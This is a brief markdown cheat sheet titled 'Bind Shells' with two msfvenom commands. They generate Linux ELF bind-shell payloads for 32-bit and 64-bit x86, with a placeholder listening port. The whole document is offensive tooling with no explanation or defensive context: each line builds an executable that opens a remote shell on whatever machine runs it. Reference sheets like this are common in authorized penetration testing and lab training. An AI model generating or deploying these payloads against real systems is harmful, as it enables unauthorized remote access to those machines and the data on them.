# Bind Shells

1. **x86 (32-bit) Payloads**

`$ msfvenom -p linux/x86/shell/bind_tcp lport=<PORT> -f elf -o shell-x86`

2. **x86-64 (64-bit) Payloads**

`$ msfvenom -p linux/x64/shell/bind_tcp lport=<PORT> -f elf -o shell-x86-64`